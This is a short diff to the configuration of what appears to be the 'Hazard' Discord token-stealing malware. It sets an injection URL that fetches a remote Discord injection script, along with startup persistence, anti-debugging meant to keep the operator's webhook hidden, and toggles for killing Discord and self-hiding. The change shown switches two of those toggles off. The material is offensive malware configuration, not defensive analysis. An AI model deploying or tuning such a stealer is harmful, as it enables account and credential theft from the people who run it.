@@ -25,11 +25,11 @@ config = {
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
-    'kill_processes': True,
+    'kill_processes': False,
     # if you want the file to run at startup
     'startup': True,
     # if you want the file to hide itself after run
-    'hide_self': True,
+    'hide_self': False,
     # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
     'anti_debug': True,
     # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
